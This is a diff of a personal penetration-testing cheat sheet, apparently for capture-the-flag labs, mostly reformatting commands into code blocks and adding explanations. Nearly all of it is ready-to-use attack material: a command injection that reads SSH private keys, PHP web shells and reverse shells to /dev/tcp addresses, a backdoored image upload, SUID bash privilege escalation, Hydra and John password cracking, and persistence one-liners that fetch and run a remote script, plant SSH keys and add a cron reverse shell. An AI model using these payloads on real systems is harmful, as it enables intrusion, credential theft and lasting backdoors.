@@ -4,30 +4,41 @@ Always try default credentials.
 
 # Reconnaissance
 https://tio.run/#
-sudo nmap -sC -sV -v -p- 10.10.10.10 --min-rate 10000
+
+```sudo nmap -sC -sV -v -p- 10.10.10.10 --min-rate 10000```
 
 # Enumerating Directories with dirsearch
-dirsearch -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -u 10.10.10.10
-dirsearch -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.10
+
+```dirsearch -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -u 10.10.10.10```
+```dirsearch -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.10```
 
 You can also run dirsearch on subdirectories (ie dirsearch website.com/api)
 
 # Relevant File System Commands
-grep -r 'looking_for_this' /in/this/directory
+
+```grep -r 'looking_for_this' /in/this/directory```
+
+We want to find the text 'looking for this', in a certain directory. This is useful for finding out where a webpage is exactly. If you know that user www-data has a web page with the text "Welcome to our website!", you can search for that text, and find out where the webpage is. Once you know wher the webpages are hosted in the file system, you can manipulate them, edit them, put in a backdoor, among many things. 
+
+
+
+```find / -name *flag* 2>/dev/null```
+Looks for everything with flag in the filename. The last part is nessesary, otherwise the command will spam you with unsuccessful searches
+
 
 # Command Injection
-;cat /home/<user>/.ssh/id_rsa to get the SSH key
-;cat /home/<user>/.ssh/id.rsa
+```;cat /home/<user>/.ssh/id_rsa```
+
 
 # SSH
 
-touch id.rsa 
+```touch id.rsa ```
 
-Edit id.rsa
+```Edit id.rsa```
 
-chmod 600 id.rsa
+```chmod 600 id.rsa```
 
-ssh -i id.rsa user@10.10.10.10
+```ssh -i id.rsa user@10.10.10.10```
 
 # Getting Remote Command Execution
 
@@ -40,45 +51,44 @@ Can also just try uploading an image file that contains only the backdoor, and i
 # PHP Payloads for File Upload Vulnerability
 
 #Command Backdoor
-<?php echo passthru($_GET['cmd']); ?>
-
+```<?php echo passthru($_GET['cmd']); ?>```
 Use like website.com/index.php?pg=/uploads/image.lol?cmd=ls
 
 # Reverse Shell
-<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.10/1234 0>&1'"); ?>
+```<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.10/1234 0>&1'"); ?>```
 
-PHP will only execute on a non-PHP file (ie .jpg) if the .jpg includes a PHP includes. We can try ```touch backdoor.jpg && echo "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.10/1234 0>&1'\"); ?>"```
+PHP will only execute on a non-PHP file (ie .jpg) if the .jpg includes a PHP includes. We can try ```touch backdoor.jpg && echo "<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.10/1234 0>&1'"); ?>"```
 
 # Privledge Escalation
 
-sudo -l
-chmod +s /bin/bash 
-cp /bin/bash /home/user/elevated-shell; chmod +s /home/user/elevated-shell
+```sudo -l```
+```chmod +s /bin/bash```
+```cp /bin/bash /home/user/elevated-shell; chmod +s /home/user/elevated-shell```
 
 
 below to find SUID binaries
-find / -perm -4000 2>/dev/null 
+```find / -perm -4000 2>/dev/null```
 
 # Password Cracking
 
 # John The Ripper
 
 To crack a password-protected zip file, first convert it into a hash that John can read
-zip2john file-to-crack.zip > hashed.john
+```zip2john file-to-crack.zip > hashed.john```
 And then call John on it
-john -w=/usr/share/wordlists/rockyou.txt hashed.john
+```john -w=/usr/share/wordlists/rockyou.txt hashed.john```
 
 To crack a SSH key
-ssh2john encrypted-id.rsa > id.rsa.john
-john -w=/usr/share/wordlists/rockyou.txt id.rsa.john
+```ssh2john encrypted-id.rsa > id.rsa.john```
+```john -w=/usr/share/wordlists/rockyou.txt id.rsa.john```
 
 # Hydra
-hydra -L users.txt -u -P /usr/share/wordlists/rockyou.txt 10.10.10.10 ssh -s 2222 -V -t 64
+```hydra -L users.txt -u -P /usr/share/wordlists/rockyou.txt 10.10.10.10 ssh -s 2222 -V -t 64```
 
 #Abusing Certain Services Angle
 
 # WordPress
-wpscan -U username --url http://website.com/wordpress -P /usr/share/wordlists/rockyou.txt
+```wpscan -U username --url http://website.com/wordpress -P /usr/share/wordlists/rockyou.txt```
 
 If we can grab wordpress admin credentials, we can pretty easily get a shell.
 
@@ -122,7 +132,7 @@ bash -i
 
 # Useful One Liners, and General Persistence
 
-wget 10.10.10.10:8080/kingme.sh && chmod u+x kingme.sh && mkdir /etc/testingdirectory &&  ./kingme.sh - u jtrigg 10.10.10.10 /etc/testingdirectory
+```wget 10.10.10.10:8080/kingme.sh && chmod u+x kingme.sh && mkdir /etc/testingdirectory &&  ./kingme.sh - u jtrigg 10.10.10.10 /etc/testingdirectory```
 
 echo "bash -i >& /dev/tcp/127.0.0.1/8080 0>&1" > /tmp/backdoor.sh
 
@@ -130,13 +140,14 @@ wget 10.10.10.10:8080/id.pub && cp id2.pub /root/.ssh/authorized_keys/ && rm id.
 
 wget 10.10.10.10:8080/id.pub && cp id2.pub /home/<user>/.ssh/authorized_keys/ && id.pub
 
-cp /bin/bash /tmp/magic && chmod +s /tmp/magic
+```cp /bin/bash /tmp/magic && chmod +s /tmp/magic```
 
 Put the below into a file named backdoor.php, and put it in one of the websites, so you can access the page.
 <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.10/1234 0>&1'"); ?>
 
-crontab -l > mycron && echo "* * * * * bash -i >& /dev/tcp/10.0.0.1/8080 0>&1" >> mycron && crontab mycron && rm mycron
+```crontab -l > mycron && echo "* * * * * bash -i >& /dev/tcp/10.0.0.1/8080 0>&1" >> mycron && crontab mycron && rm mycron```
 
 # Neat Links
 https://pentestbook.six2dez.com/enumeration/ports
+
 https://www.revshells.com/
